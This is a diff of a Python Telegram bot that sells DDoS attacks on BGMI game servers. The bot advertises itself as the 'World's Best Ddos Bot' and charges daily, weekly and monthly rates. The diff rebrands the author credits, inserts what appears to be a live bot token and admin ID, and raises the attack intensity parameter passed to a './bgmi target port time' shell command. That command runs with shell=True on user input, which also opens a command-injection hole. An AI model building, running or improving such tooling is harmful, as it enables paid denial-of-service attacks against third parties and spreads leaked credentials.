@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-#By @venomXCRAZY
+#By @HYPER_OMI
 
 import telebot
 import subprocess
@@ -8,10 +8,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('TOKEN')
+bot = telebot.TeleBot('7451177573:AAGM6-JmcjFF7WQ49XwO-Ci5AJSwwp4TWL8')
 
 # Admin user IDs
-admin_id = ["YOUR ID"]
+admin_id = ["6310751880"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -242,13 +242,13 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
+                full_command = f"./bgmi {target} {port} {time} 2000"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\nBy @venomXcrazy"  # Updated command syntax
+            response = "Usage :- /bgmi <target> <port> <time>\nBy @HYPER_OMI"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\nBy @venomXcrazy"
+        response = "You Are Not Authorized To Use This Command.\nBy @HYPER_OMI"
 
     bot.reply_to(message, response)
 
@@ -285,7 +285,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By  @venomXcrazy
+ By  @HYPER_OMI
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -300,7 +300,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @venomXcrazy"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @HYPE_OMI"
     bot.reply_to(message, response)
 
 
@@ -312,7 +312,7 @@ def welcome_rules(message):
 1. Dont Run Too Many Attacks !! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
 3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-By @venomXcrazy'''
+By @HYPER_OMI'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['plan'])
@@ -329,7 +329,7 @@ Pr-ice List:
 Day-->100 Rs
 Week-->250 Rs
 Month-->600 Rs
-By  @venomXcrazy
+By  @HYPER_OMI
 '''
     bot.reply_to(message, response)
 
@@ -344,7 +344,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By  @venomXcrazy
+By  @HYPER_OMI
 '''
     bot.reply_to(message, response)
 
@@ -375,4 +375,4 @@ def broadcast_message(message):
 
 
 bot.polling()
-#By venom crazy  @venomXcrazy
+#By HYPER OMI  @HYPER_OMI
